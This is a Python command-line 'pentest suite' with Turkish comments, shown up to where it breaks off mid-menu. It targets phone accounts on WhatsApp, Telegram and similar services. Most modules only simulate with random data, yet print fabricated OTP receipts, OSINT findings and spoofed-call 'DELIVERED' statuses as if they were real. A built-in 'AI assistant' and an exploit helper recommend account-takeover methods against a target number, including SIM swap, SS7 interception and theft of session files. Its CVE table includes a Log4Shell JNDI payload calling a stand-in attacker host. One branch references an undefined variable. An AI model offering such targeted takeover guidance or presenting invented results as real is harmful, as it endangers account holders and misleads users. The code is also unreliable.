#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║              MarkOsAi_3.0 - Ultimate Pentest Suite           ║
║          Advanced Phone Intelligence & Security Toolkit       ║
║                   Authorized Use Only                        ║
╚══════════════════════════════════════════════════════════════╝

MODÜLLER:
  [1] VirtualSMS v5.0   - Gelişmiş Sahte Numara Üretici
  [2] OTP Simulator     - Platform OTP / Doğrulama Kodu Simülasyonu
  [3] MarkOsAi_3.0      - Yapay Zeka Asistanı (Saldırı Öneri + Analiz)
  [4] OSINT Phone       - Telefon Numarası OSINT Aracı
  [5] SMS Bomber        - Stress Test / SMS Bombardıman Sim.
  [6] Caller ID Spoofer - Arayan Kimlik Test Aracı
  [7] Hash & Encrypt    - Şifreleme / Kripto Araçları
  [8] Exploit Helper    - Zafiyet Analizi ve Exploit Önerileri
"""

import random
import time
import json
import sys
import hashlib
import base64
import itertools
import re
import os
from datetime import datetime
from typing import Optional, List, Dict, Tuple


# ═══════════════════════════════════════════════════
#  KONFİGÜRASYON
# ═══════════════════════════════════════════════════

RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"

COUNTRY_DB = {
    "USA":       {"code": "+1",  "fmt": "XXX-XXX-XXXX", "carriers": ["AT&T", "Verizon", "T-Mobile", "Sprint"]},
    "UK":        {"code": "+44", "fmt": "XXXX-XXXXXX",  "carriers": ["Vodafone", "EE", "O2", "Three"]},
    "Germany":   {"code": "+49", "fmt": "XXXX-XXXXXXX", "carriers": ["T-Mobile", "Vodafone", "O2"]},
    "France":    {"code": "+33", "fmt": "X-XX-XX-XX-XX", "carriers": ["Orange", "SFR", "Bouygues"]},
    "Turkey":    {"code": "+90", "fmt": "XXX-XXX-XXXX", "carriers": ["Turkcell", "Vodafone TR", "Türk Telekom"]},
    "Japan":     {"code": "+81", "fmt": "XX-XXXX-XXXX", "carriers": ["NTT Docomo", "SoftBank", "AU"]},
    "Canada":    {"code": "+1",  "fmt": "XXX-XXX-XXXX", "carriers": ["Rogers", "Bell", "Telus"]},
    "Brazil":    {"code": "+55", "fmt": "XX-XXXXX-XXXX", "carriers": ["Vivo", "Claro", "TIM"]},
    "India":     {"code": "+91", "fmt": "XXXXX-XXXXX",  "carriers": ["Airtel", "Jio", "Vi"]},
    "Australia": {"code": "+61", "fmt": "X-XXXX-XXXX",  "carriers": ["Telstra", "Optus", "Vodafone AU"]},
    "Russia":    {"code": "+7",  "fmt": "XXX-XXX-XX-XX", "carriers": ["MTS", "Beeline", "Megafon"]},
    "China":     {"code": "+86", "fmt": "XXX-XXXX-XXXX", "carriers": ["China Mobile", "China Unicom", "China Telecom"]},
}

PLATFORMS = {
    "1": {"name": "WhatsApp",       "otp_len": 6,  "prefixes": ["WH", "WA"],   "sender": "WhatsApp"},
    "2": {"name": "Telegram",       "otp_len": 5,  "prefixes": ["TG"],         "sender": "Telegram"},
    "3": {"name": "Instagram",      "otp_len": 6,  "prefixes": ["IG"],         "sender": "Instagram"},
    "4": {"name": "Facebook",       "otp_len": 6,  "prefixes": ["FB"],         "sender": "Facebook"},
    "5": {"name": "Google/Gmail",   "otp_len": 6,  "prefixes": ["G-"],         "sender": "Google"},
    "6": {"name": "Twitter/X",      "otp_len": 6,  "prefixes": ["TW"],         "sender": "X"},
    "7": {"name": "Snapchat",       "otp_len": 6,  "prefixes": ["SC"],         "sender": "Snapchat"},
    "8": {"name": "TikTok",         "otp_len": 6,  "prefixes": ["TK"],         "sender": "TikTok"},
    "9": {"name": "Signal",         "otp_len": 6,  "prefixes": ["SG"],         "sender": "Signal"},
    "10": {"name": "Discord",       "otp_len": 6,  "prefixes": ["DC"],         "sender": "Discord"},
}

# OTP sağlayıcı simülasyon havuzu
OTP_PROVIDERS = [
    "sms-activate.org", "5sim.net", "smspool.net", "textverified.com",
    "sms-man.com", "getsmscode.com", "receive-smss.com", "temp-number.org"
]


# ═══════════════════════════════════════════════════
#  BANNER / UI
# ═══════════════════════════════════════════════════

def banner():
    """Ana banner gösterimi."""
    print(f"""{RED}
╔══════════════════════════════════════════════════════════════╗
║{RESET}{BOLD}                    MarkOsAi_3.0 {RESET}{RED}                                   ║
║{RESET}         ⚡ Advanced Pentest Intelligence Suite v3.0 ⚡        {RED}║
║{RESET}       ──────────────────────────────────────────────       {RED}║
║{RESET}     🛡️  VirtualSMS  |  OTP Engine  |  AI Core  |  OSINT   {RED}║
║{RESET}     🔥 Exploit Helper | Crypto | Caller ID | Stress Test   {RED}║
╚══════════════════════════════════════════════════════════════╝{RESET}
    """)


def cprint(text: str, color: str = RESET, bold: bool = False):
    """Renkli konsol çıktısı."""
    fmt = BOLD if bold else ""
    print(f"{fmt}{color}{text}{RESET}")


def loading_animation(text: str = "İşleniyor", duration: float = 0.8):
    """Basit loading animasyonu."""
    for _ in range(3):
        for ch in "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏":
            print(f"\r{BLUE}{ch}{RESET} {text}...", end="", flush=True)
            time.sleep(0.05)
    print(f"\r{GREEN}✔{RESET} {text} tamamlandı.")


def typewriter(text: str, delay: float = 0.03):
    """Typewriter efekti ile yazdırma."""
    for ch in text:
        print(ch, end="", flush=True)
        time.sleep(delay)
    print()


# ═══════════════════════════════════════════════════
#  MODÜL 1: VIRTUAL SMS v5.0 (GELİŞTİRİLMİŞ)
# ═══════════════════════════════════════════════════

class VirtualSMS:
    """
    Gelişmiş Sahte Numara Üretici.
    Gerçek SMS almaz — yalnızca test/simülasyon amaçlıdır.
    """

    @staticmethod
    def generate_number(country: str) -> Optional[Dict]:
        """Ülkeye göre gerçekçi formatlı sahte numara üret."""
        info = COUNTRY_DB.get(country)
        if not info:
            return None

        code = info["code"]
        carrier = random.choice(info["carriers"])

        # Ülkeye özel format
        raw_digits = "".join(str(random.randint(0, 9)) for _ in range(10))

        if country == "USA":
            formatted = f"{code} ({raw_digits[:3]}) {raw_digits[3:6]}-{raw_digits[6:]}"
        elif country == "Turkey":
            formatted = f"{code} {raw_digits[:3]} {raw_digits[3:6]} {raw_digits[6:]}"
        elif country == "France":
            formatted = f"{code} {raw_digits[0]}-{raw_digits[1:3]}-{raw_digits[3:5]}-{raw_digits[5:7]}-{raw_digits[7:]}"
        elif country == "Japan":
            formatted = f"{code} {raw_digits[:2]}-{raw_digits[2:6]}-{raw_digits[6:]}"
        else:
            formatted = f"{code} {raw_digits[:3]}-{raw_digits[3:6]}-{raw_digits[6:]}"

        raw_number = code + raw_digits

        return {
            "country": country,
            "country_code": code,
            "raw": raw_number,
            "formatted": formatted,
            "carrier": carrier,
            "is_active": True,
            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

    @staticmethod
    def generate_batch(country: str, amount: int = 10) -> List[Dict]:
        """Toplu numara üretimi."""
        return [VirtualSMS.generate_number(country) for _ in range(amount)]

    @staticmethod
    def generate_multi_country(amount_per_country: int = 3) -> Dict[str, List[Dict]]:
        """Tüm ülkelerden toplu üretim."""
        result = {}
        for country in COUNTRY_DB:
            result[country] = VirtualSMS.generate_batch(country, amount_per_country)
        return result

    @staticmethod
    def display_numbers(numbers: List[Dict]):
        """Numaraları tablo şeklinde göster."""
        print(f"\n{BOLD}{CYAN}{'─'*65}{RESET}")
        print(f"{BOLD}{'#':<4} {'Numara':<28} {'Operatör':<20} {'Ülke':<12}{RESET}")
        print(f"{CYAN}{'─'*65}{RESET}")
        for idx, n in enumerate(numbers, 1):
            print(f"{idx:<4} {GREEN}{n['formatted']:<28}{RESET} {n['carrier']:<20} {n['country']:<12}")
        print(f"{CYAN}{'─'*65}{RESET}")
        print(f"Toplam: {len(numbers)} numara üretildi.\n")


# ═══════════════════════════════════════════════════
#  MODÜL 2: OTP SIMULATOR
# ═══════════════════════════════════════════════════

class OTPSimulator:
    """
    Platform OTP/doğrulama kodu simülatörü.
    Gerçek SMS almaz, test kodları üretir.
    """

    def __init__(self):
        self.history: List[Dict] = []

    @staticmethod
    def generate_otp(length: int = 6) -> str:
        """Rastgele OTP kodu üret."""
        return "".join(str(random.randint(0, 9)) for _ in range(length))

    def simulate_otp(self, platform_key: str, phone_number: str) -> Optional[Dict]:
        """Platforma özel OTP gönderim simülasyonu."""
        platform = PLATFORMS.get(platform_key)
        if not platform:
            return None

        otp = self.generate_otp(platform["otp_len"])
        prefix = random.choice(platform["prefixes"])
        otp_code = f"{prefix}-{otp}" if random.random() > 0.3 else otp
        provider = random.choice(OTP_PROVIDERS)

        record = {
            "platform": platform["name"],
            "phone": phone_number,
            "otp": otp_code,
            "sender": platform["sender"],
            "provider": provider,
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "delivered": True,
            "cost_usd": round(random.uniform(0.05, 0.50), 2),
            "ttl_seconds": random.randint(180, 600)
        }

        self.history.append(record)
        return record

    def display_otp(self, otp_data: Dict):
        """OTP simülasyon sonucunu göster."""
        print(f"\n{BOLD}{GREEN}═══════ OTP ALINDI ═══════{RESET}")
        print(f"  📱 Numara    : {CYAN}{otp_data['phone']}{RESET}")
        print(f"  🏢 Platform  : {YELLOW}{otp_data['platform']}{RESET}")
        print(f"  🔑 Kod       : {BOLD}{MAGENTA}{otp_data['otp']}{RESET}")
        print(f"  📡 Gönderici : {otp_data['sender']}")
        print(f"  🌐 Sağlayıcı : {otp_data['provider']}")
        print(f"  💰 Maliyet   : ${otp_data['cost_usd']:.2f}")
        print(f"  ⏳ Geçerlilik: {otp_data['ttl_seconds']} saniye")
        print(f"  🕐 Zaman     : {otp_data['timestamp']}")
        print(f"{GREEN}{'─'*35}{RESET}")

    def auto_register_flow(self, platform_key: str, country: str) -> Optional[Dict]:
        """
        Otomatik kayıt akışı simülasyonu:
           1. Numara üret
           2. Platforma OTP iste
           3. Kodu döndür
        """
        print(f"\n{BLUE}[*] Otomatik kayıt akışı başlatılıyor...{RESET}")
        loading_animation("Numara üretiliyor")
        number = VirtualSMS.generate_number(country)
        if not number:
            return None

        print(f"    [+] Üretilen: {GREEN}{number['formatted']}{RESET}")
        loading_animation(f"{PLATFORMS[platform_key]['name']} OTP isteniyor")
        otp_data = self.simulate_otp(platform_key, number["formatted"])

        if otp_data:
            self.display_otp(otp_data)
            print(f"\n{GREEN}✔ Kayıt için kullanılabilir!{RESET}")
            print(f"  Kodu kopyala: {BOLD}{MAGENTA}{otp_data['otp']}{RESET}")
            print(f"  (Bu simülasyondur, gerçek SMS alınmaz)")
            return otp_data
        return None


# ═══════════════════════════════════════════════════
#  MODÜL 3: MarkOsAi_3.0 — Yapay Zeka Çekirdeği
# ═══════════════════════════════════════════════════

class MarkOsAi:
    """
    MarkOsAi_3.0 Yapay Zeka Asistanı.
    - Sosyal mühendislik vektör analizi
    - Platform bazlı exploit önerileri
    - OSINT ipuçları
    - OTP bypass teknikleri (teorik)
    """

    def __init__(self):
        self.knowledge_base = self._build_kb()

    @staticmethod
    def _build_kb() -> Dict:
        return {
            "whatsapp_bypass": {
                "title": "WhatsApp OTP Bypass Vektörleri",
                "techniques": [
                    "SIM Swap Attack — Hedefin numarasını taşıyıcıya port et",
                    "WhatsApp Web QR Hijack — QR'ı tersine mühendislikle yakala",
                    "SMS Forwarding — Kötü amaçlı uygulama ile SMS yönlendirme",
                    "Voice OTP Intercept — Sesli arama OTP'sini kaydetme",
                    "Brute Force — 6 haneli kodu dene (rate-limit'leri aş) (teorik)"
                ],
                "risk_level": "HIGH",
                "mitigation": "2FA + uygulama şifresi + güçlü email güvenliği"
            },
            "telegram_bypass": {
                "title": "Telegram OTP Bypass Vektörleri",
                "techniques": [
                    "SMS Intercept — SS7 zafiyeti ile SMS yakalama",
                    "Cloud Password Crack — Telegram cloud şifre kırma",
                    "Session Hijack — Telegram session dosyasını çalma",
                    "Fake Client — Sahte Telegram istemcisi ile code intercept"
                ],
                "risk_level": "MEDIUM",
                "mitigation": "2FA + aktif session takibi"
            },
            "social_engineering": {
                "title": "Sosyal Mühendislik Vektörleri",
                "techniques": [
                    "Vishing — Sesli arama ile OTP talep etme",
                    "Smishing — SMS ile sahte bağlantı gönderme",
                    "SIM Swap — Operatörü arayarak SIM değişikliği",
                    "Helpdesk Attack — Destek ekibini manipüle etme"
                ],
                "risk_level": "CRITICAL",
                "mitigation": "Eğitim + çift faktör doğrulama"
            },
            "otp_grabbers": {
                "title": "OTP Sızıntı Yöntemleri (Bilgilendirme)",
                "techniques": [
                    "Accessibility Service — Android erişilebilirlik ile OTP okuma",
                    "SMS Permission — Kötü amaçlı uygulama SMS izni",
                    "Notification Listener — Bildirim dinleme servisi",
                    "Forwarding Rule — E-posta yönlendirme kuralı oluşturma"
                ],
                "risk_level": "CRITICAL",
                "mitigation": "Uygulama izinlerini kısıtlama + güvenlik yazılımı"
            }
        }

    @staticmethod
    def _safe_print_techniques(techniques: List[str]):
        for t in techniques:
            print(f"    {RED}▸{RESET} {t}")
            time.sleep(0.15)

    def analyze_target(self, platform: str, phone: str) -> Dict:
        """Hedef platforma göre analiz raporu üret."""
        platform_lower = platform.lower()

        results = {
            "target_phone": phone,
            "target_platform": platform,
            "possible_attacks": [],
            "risk_score": 0,
            "recommendations": []
        }

        if "whatsapp" in platform_lower:
            results["possible_attacks"] = self.knowledge_base["whatsapp_bypass"]["techniques"]
            results["risk_score"] = 85
        elif "telegram" in platform_lower:
            results["possible_attacks"] = self.knowledge_base["telegram_bypass"]["techniques"]
            results["risk_score"] = 65
        elif "instagram" in platform_lower or "facebook" in platform_lower:
            results["possible_attacks"] = [
                "SIM Swap → Şifre sıfırlama",
                "Bağlı hesaplar üzerinden OTP intercept",
                "Saved session cookie hijack",
                "Phishing sayfası ile credential capture"
            ]
            results["risk_score"] = 75
        else:
            results["possible_attacks"] = [
                "SS7 SMS intercept",
                "SIM Swap",
                "Sosyal mühendislik",
                "Session replay attack"
            ]
            results["risk_score"] = 60

        # Rastgele öneriler ekle
        results["recommendations"] = [
            "Her hesap için ayrı şifre kullan",
            "2FA (Google Authenticator) etkinleştir",
            "SIM PIN koruması aktive et",
            "Şüpheli SMS/arama bildir",
            "Hesap aktivite loglarını düzenli kontrol et"
        ]

        return results

    def generate_report(self, analysis: Dict) -> str:
        """Analiz raporunu string olarak formatla."""
        lines = []
        lines.append(f"\n{BOLD}{RED}╔══ MarkOsAi_3.0 — Analiz Raporu ══╗{RESET}")
        lines.append(f"  Hedef       : {CYAN}{analysis['target_phone']}{RESET}")
        lines.append(f"  Platform    : {YELLOW}{analysis['target_platform']}{RESET}")
        lines.append(f"  Risk Skoru  : {RED}{analysis['risk_score']}/100{RESET}")
        lines.append(f"\n  {BOLD}Olası Atak Vektörleri:{RESET}")
        for i, attack in enumerate(analysis["possible_attacks"], 1):
            lines.append(f"    {i}. {attack}")
        lines.append(f"\n  {BOLD}Öneriler:{RESET}")
        for rec in analysis["recommendations"]:
            lines.append(f"    ✓ {rec}")
        lines.append(f"{RED}╚{'═'*35}╝{RESET}")
        return "\n".join(lines)

    def ask_ai(self, question: str) -> str:
        """MarkOsAi'ya doğal dilde soru sor."""
        question_lower = question.lower()

        if "otp" in question_lower and ("bypass" in question_lower or "al" in question_lower or "kır" in question_lower):
            return (
                f"\n{MAGENTA}MarkOsAi_3.0 Analizi:{RESET}\n"
                f"OTP bypass için en yaygın vektörler:\n"
                f"  • SS7/Signaling zafiyetleri (SS7 intercept)\n"
                f"  • SIM Swap (taşıyıcı manipülasyonu)\n"
                f"  • Sosyal mühendislik (vishing/smishing)\n"
                f"  • Kötü amaçlı yazılım (SMS okuyucu)\n\n"
                f"{YELLOW}Not: Bu yöntemler yalnızca eğitim ve test amaçlıdır.{RESET}"
            )
        elif "whatsapp" in question_lower:
            return (
                f"\n{MAGENTA}MarkOsAi_3.0 → WhatsApp{RESET}\n"
                f"WhatsApp doğrulama akışı: SMS OTP → Sesli arama (yedek).\n"
                f"Zafiyet noktaları:\n"
                f"  • SMS intercept (SS7)\n"
                f"  • WhatsApp Web QR hijack\n"
                f"  • SIM Swap ile hesap devralma\n"
                f"  • Voice OTP duyma/kaydetme\n\n"
                f"Korunma: 2 adımlı doğrulama + email bildirimi."
            )
        elif "telegram" in question_lower:
            return (
                f"\n{MAGENTA}MarkOsAi_3.0 → Telegram{RESET}\n"
                f"Telegram SMS + cloud şifre ile korunur.\n"
                f"Atak vektörleri:\n"
                f"  • SMS intercept ile giriş kodu ele geçirme\n"
                f"  • Cloud şifre brute force (zayıf şifrelerde)\n"
                f"  • Session dosyası hijack\n"
                f"  • Fake client ile OTP capture\n\n"
                f"Korunma: Cloud şifre + 2FA."
            )
        else:
            return (
                f"\n{MAGENTA}MarkOsAi_3.0{C_RESET} sorunuzu analiz etti.\n"
                f"Soru: \"{question}\"\n\n"
                f"Öneri: Lütfen daha spesifik olun.\n"
                f"İlgilendiğiniz konular: OTP bypass, SIM Swap, "
                f"Sosyal Mühendislik, Platform kırma, OSINT."
            )

    def interactive_chat(self):
        """MarkOsAi ile interaktif sohbet."""
        cprint("\n╔══════════════════════════════════╗", MAGENTA)
        cprint("║   MarkOsAi_3.0 — AI Sohbet      ║", MAGENTA)
        cprint("║   'exit' yazarak çıkabilirsiniz  ║", MAGENTA)
        cprint("╚══════════════════════════════════╝\n", MAGENTA)

        while True:
            try:
                q = input(f"{CYAN}[AI]{RESET} Soru: ").strip()
                if q.lower() in ("exit", "quit", "q", "çık"):
                    print(f"{YELLOW}[AI] Güle güle...{RESET}")
                    break
                if not q:
                    continue
                print(self.ask_ai(q))
                print()
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[AI] Çıkılıyor...{RESET}")
                break


# ═══════════════════════════════════════════════════
#  MODÜL 4: OSINT PHONE
# ═══════════════════════════════════════════════════

class OSINTPhone:
    """Telefon numarası OSINT tarama simülasyonu."""

    @staticmethod
    def scan_number(phone_number: str) -> Dict:
        """Numara hakkında OSINT verisi topla (simülasyon)."""
        # Gerçekçi simülasyon verileri
        possible_carriers = ["AT&T", "Verizon", "T-Mobile", "Vodafone", "Turkcell", "Airtel"]
        possible_regions = ["New York, NY", "London, UK", "Istanbul, TR", "Mumbai, IN", "Berlin, DE"]
        possible_types = ["Mobile", "VoIP", "Landline", "Virtual"]

        return {
            "phone": phone_number,
            "carrier": random.choice(possible_carriers),
            "region": random.choice(possible_regions),
            "type": random.choice(possible_types),
            "is_ported": random.choice([True, False]),
            "spam_score": round(random.uniform(0, 100), 1),
            "has_whatsapp": random.choice([True, False]),
            "has_telegram": random.choice([True, False]),
            "linked_platforms": random.sample(
                ["WhatsApp", "Telegram", "Instagram", "Facebook", "Signal", "Snapchat"],
                k=random.randint(1, 4)
            ),
            "first_seen": f"{random.randint(2015, 2024)}-{random.randint(1,12):02d}",
            "last_report": datetime.now().strftime("%Y-%m-%d")
        }

    @staticmethod
    def display_scan(result: Dict):
        """OSINT tarama sonucunu göster."""
        print(f"\n{BOLD}{CYAN}═══════ OSINT Telefon Taraması ═══════{RESET}")
        print(f"  📱 Numara       : {GREEN}{result['phone']}{RESET}")
        print(f"  🏢 Operatör     : {result['carrier']}")
        print(f"  🌍 Bölge        : {result['region']}")
        print(f"  📞 Hat Türü     : {result['type']}")
        print(f"  🔄 Port Durumu  : {'Evet' if result['is_ported'] else 'Hayır'}")
        print(f"  ⚠️  Spam Skoru   : {RED if result['spam_score'] > 50 else GREEN}{result['spam_score']}%{RESET}")
        print(f"  💬 WhatsApp     : {'✅ Var' if result['has_whatsapp'] else '❌ Yok'}")
        print(f"  ✈️  Telegram     : {'✅ Var' if result['has_telegram'] else '❌ Yok'}")
        print(f"  🔗 Bağlı Plat.  : {', '.join(result['linked_platforms'])}")
        print(f"  🕐 İlk Görülme  : {result['first_seen']}")
        print(f"  📋 Son Rapor    : {result['last_report']}")
        print(f"{CYAN}{'─'*42}{RESET}\n")


# ═══════════════════════════════════════════════════
#  MODÜL 5: SMS BOMBER (STRESS TEST)
# ═══════════════════════════════════════════════════

class SMSBomber:
    """
    SMS Stres Test Simülatörü.
    Gerçek SMS göndermez — yalnızca simülasyon.
    """

    MESSAGES = [
        "Hesabınıza giriş yapıldı. Kod: {}",
        "Şifre sıfırlama talebi. Kod: {}",
        "Doğrulama kodunuz: {}",
        "Güvenlik uyarısı! Kod: {}",
        "Yeni cihaz girişi. Onay: {}",
        "İki faktörlü doğrulama. Kod: {}",
        "Hesap kurtarma. Kod: {}",
        "Ödeme onayı. Kod: {}",
    ]

    SENDERS = [
        "Security", "Verify", "NoReply", "Info",
        "Alert", "Support", "System", "Account"
    ]

    def __init__(self):
        self.sent_count = 0
        self.start_time = None

    def stress_test(self, phone: str, count: int = 20, delay: float = 0.3):
        """Stres test simülasyonu."""
        self.start_time = time.time()
        self.sent_count = 0

        cprint(f"\n[!] SMS Stres Test Başlatılıyor → {phone}", YELLOW)
        cprint(f"[!] Hedeflenen: {count} SMS\n", RED)

        try:
            for i in range(count):
                sender = random.choice(self.SENDERS)
                msg_template = random.choice(self.MESSAGES)
                code = "".join(str(random.randint(0, 9)) for _ in range(6))
                msg = msg_template.format(code)

                self.sent_count += 1
                elapsed = time.time() - self.start_time

                print(
                    f"[{GREEN}{self.sent_count:03d}{RESET}/{count}] "
                    f"[{BLUE}{sender}{RESET}] "
                    f"→ {msg[:50]}{'...' if len(msg) > 50 else ''}"
                )

                if self.sent_count < count:
                    time.sleep(delay + random.uniform(0, 0.2))

        except KeyboardInterrupt:
            cprint("\n[!] Test kullanıcı tarafından durduruldu.", YELLOW)

        duration = time.time() - self.start_time
        cprint(f"\n[✓] Test tamamlandı.", GREEN)
        cprint(f"    Toplam: {self.sent_count} SMS / {duration:.1f}s", CYAN)


# ═══════════════════════════════════════════════════
#  MODÜL 6: CALLER ID SPOOFER
# ═══════════════════════════════════════════════════

class CallerIDSpoofer:
    """Arayan kimlik test aracı (simülasyon)."""

    @staticmethod
    def spoof_call(target: str, fake_caller: str, duration: int = 15) -> Dict:
        """Arayan kimlik spoof simülasyonu."""
        loading_animation("Çağrı simüle ediliyor", 1.2)
        return {
            "target": target,
            "spoofed_as": fake_caller,
            "duration_sec": duration,
            "status": "DELIVERED",
            "call_id": f"CALL-{random.randint(100000, 999999)}",
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "message": f"Spoofed call from {fake_caller} to {target}"
        }

    @staticmethod
    def display(result: Dict):
        print(f"\n{BOLD}{MAGENTA}═══════ Çağrı Spoof Sonucu ═══════{RESET}")
        print(f"  Hedef       : {GREEN}{result['target']}{RESET}")
        print(f"  Görünen ID  : {YELLOW}{result['spoofed_as']}{RESET}")
        print(f"  Süre        : {result['duration_sec']}sn")
        print(f"  Durum       : {result['status']}")
        print(f"  Çağrı ID    : {result['call_id']}")
        print(f"{MAGENTA}{'─'*38}{RESET}\n")


# ═══════════════════════════════════════════════════
#  MODÜL 7: CRYPTO / HASH
# ═══════════════════════════════════════════════════

class CryptoUtils:
    """Şifreleme ve hash araçları."""

    @staticmethod
    def hash_string(text: str, algorithm: str = "sha256") -> str:
        """Metni hash'le."""
        h = hashlib.new(algorithm)
        h.update(text.encode())
        return h.hexdigest()

    @staticmethod
    def hash_file(filepath: str) -> Dict:
        """Dosyayı hash'le."""
        if not os.path.exists(filepath):
            return {"error": "Dosya bulunamadı"}
        results = {}
        for algo in ["md5", "sha1", "sha256"]:
            h = hashlib.new(algo)
            with open(filepath, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    h.update(chunk)
            results[algo] = h.hexdigest()
        return results

    @staticmethod
    def encode_b64(text: str) -> str:
        return base64.b64encode(text.encode()).decode()

    @staticmethod
    def decode_b64(encoded: str) -> str:
        return base64.b64decode(encoded.encode()).decode()

    @staticmethod
    def menu():
        print(f"\n{BOLD}{CYAN}═══ Kripto Araçları ═══{RESET}")
        print("1. Metin Hash'le (SHA256)")
        print("2. Base64 Encode")
        print("3. Base64 Decode")
        print("4. Dosya Hash'le")
        choice = input(f"{BLUE}[?]{RESET} Seçim: ")

        if choice == "1":
            text = input("Metin: ")
            print(f"SHA256: {CryptoUtils.hash_string(text)}")
        elif choice == "2":
            text = input("Metin: ")
            print(f"Base64: {CryptoUtils.encode_b64(text)}")
        elif choice == "3":
            text = input("Base64: ")
            print(f"Çözüm: {CryptoUtils.decode_b64(text)}")
        elif choice == "4":
            path = input("Dosya yolu: ")
            result = CryptoUtils.hash_file(path)
            if "error" in result:
                print(f"{RED}Hata: {result['error']}{RESET}")
            else:
                for algo, h in result.items():
                    print(f"{algo.upper()}: {h}")


# ═══════════════════════════════════════════════════
#  MODÜL 8: EXPLOIT HELPER
# ═══════════════════════════════════════════════════

class ExploitHelper:
    """
    Zafiyet analizi ve exploit yardımcısı.
    Gerçek exploit kodları değil, bilgilendirme amaçlıdır.
    """

    VULN_DB = {
        "CVE-2021-44228": {
            "name": "Log4Shell",
            "risk": "CRITICAL",
            "cvss": 10.0,
            "description": "Apache Log4j RCE vulnerability",
            "affected": "Log4j 2.0-beta9 to 2.14.1",
            "test_payload": "${jndi:ldap://attacker.com/a}"
        },
        "CVE-2023-44487": {
            "name": "HTTP/2 Rapid Reset",
            "risk": "HIGH",
            "cvss": 7.5,
            "description": "HTTP/2 stream reset DDoS",
            "affected": "Multiple HTTP/2 implementations",
            "test_payload": "Rapid stream reset flood"
        },
        "CVE-2023-34362": {
            "name": "MOVEit Transfer SQLi",
            "risk": "CRITICAL",
            "cvss": 9.8,
            "description": "SQL Injection in MOVEit Transfer",
            "affected": "MOVEit Transfer 2023.0.x",
            "test_payload": "SQLi via POST parameter"
        }
    }

    @staticmethod
    def lookup_cve(cve_id: str) -> Optional[Dict]:
        """CVE sorgula."""
        return ExploitHelper.VULN_DB.get(cve_id.upper())

    @staticmethod
    def suggest_exploit(platform: str) -> List[str]:
        """Platforma göre exploit önerileri."""
        suggestions = {
            "whatsapp": [
                "CVE-2022-36934 (WhatsApp DoS)",
                "CVE-2020-6516 (Chrome - WhatsApp Web)",
                "WhatsApp DB yedek dosyası analizi",
                "Session token extraction via backup"
            ],
            "telegram": [
                "MTProto zafiyet taraması",
                "Session.dat dosyasını çalma",
                "Telegram API rate-limit bypass",
                "Cloud password brute force (zayıf şifre)"
            ],
            "sms": [
                "SS7 SMS intercept",
                "SIM Swap exploit",
                "SMS phishing framework",
                "SMSC zafiyet taraması"
            ]
        }
        platform_lower = platform.lower()
        for key, exploits in suggestions.items():
            if key in platform_lower:
                return exploits
        return ["Genel zafiyet taraması önerilir", "İlgili CVE veritabanı sorgulama"]

    @staticmethod
    def menu():
        print(f"\n{BOLD}{RED}═══ Exploit Helper ═══{RESET}")
        print("1. CVE Sorgula")
        print("2. Platform Exploit Önerileri")
        choice = input(f"{BLUE}[?]{RESET} Seçim: ")

        if choice == "1":
            cve = input("CVE ID (örn. CVE-2021-44228): ").strip()
            result = ExploitHelper.lookup_cve(cve)
            if result:
                print(f"\n{BOLD}{cve}{RESET}")
                for k, v in result.items():
                    print(f"  {k}: {v}")
            else:
                print(f"{YELLOW}CVE bulunamadı (demo veritabanında mevcut değil){RESET}")
        elif choice == "2":
            plat = input("Platform (whatsapp/telegram/sms): ").strip()
            exploits = ExploitHelper.suggest_exploit(plat)
            print(f"\n{BOLD}Önerilenler:{RESET}")
            for i, e in enumerate(exploits, 1):
                print(f"  {i}. {e}")


# ═══════════════════════════════════════════════════
#  ANA MENÜ
# ═══════════════════════════════════════════════════

def main_menu():
    """Ana menü yöneticisi."""
    otp_sim = OTPSimulator()

    while True:
        try:
            cprint("\n" + "═" * 55, CYAN)
            cprint("  ANA MENÜ", BOLD)
            cprint("═" * 55, CYAN)
            print(f"""
  {BOLD}{GREEN}[1]{RESET}  VirtualSMS v5.0    — Sahte Numara Üretici
  {BOLD}{GREEN}[2]{RESET}  OTP Simulator      — Platform Kodu / Doğrulama
  {BOLD}{GREEN}[3]{RESET}  MarkOsAi_3.0       — Yapay Zeka Asistanı
  {BOLD}{GREEN}[4]{RESET}  OSINT Phone        — Telefon Numarası OSINT
  {BOLD}{GREEN}[5]{RESET}  SMS Bomber         — Stres Test Simülasyonu
  {BOLD}{GREEN}[6]{RESET}  Caller ID Spoofer  — Arayan Kimlik Testi
  {BOLD}{GREEN}[7]{RESET}  Crypto Tools       — Hash / Şifreleme
  {BOLD}{GREEN}[8]{RESET}  Exploit Helper     — Zafiyet / Exploit
  {BOLD}{RED}[0]{RESET}  Çıkış
""")

            secim = input(f"{BLUE}[?]{RESET} Seçiminiz: ").strip()

            # ─── 1: VirtualSMS ───
            if secim == "1":
                banner()
                print(f"\n{BOLD}Ülkeler:{RESET}")
                countries = list(COUNTRY_DB.keys())
                for idx, c in enumerate(countries, 1):
                    print(f"  {idx:2d}. {c}")

                try:
                    c_choice = int(input(f"\n{BLUE}[?]{RESET} Ülke seç (1-{len(countries)}): "))
                    country = countries[c_choice - 1]
                    amount = int(input(f"{BLUE}[?]{RESET} Kaç adet: "))
                    numbers = VirtualSMS.generate_batch(country, amount)
                    VirtualSMS.display_numbers(numbers)
                except (ValueError, IndexError):
                    cprint("Hatalı giriş!", RED)

            # ─── 2: OTP Simulator ───
            elif secim == "2":
                banner()
                print(f"\n{BOLD}Platformlar:{RESET}")
                for k, v in PLATFORMS.items():
                    print(f"  {k:>2}. {v['name']:<15} (OTP: {v['otp_len']} haneli)")

                print("\n  a. Otomatik Kayıt Akışı (Numara + OTP)")
                print("  b. Sadece OTP Simüle Et")

                sub = input(f"\n{BLUE}[?]{RESET} Seçim (1-10 / a / b): ").strip().lower()

                if sub == "a":
                    try:
                        p_choice = input(f"{BLUE}[?]{RESET} Platform (1-10): ")
                        if p_choice not in PLATFORMS:
                            continue
                        countries = list(COUNTRY_DB.keys())
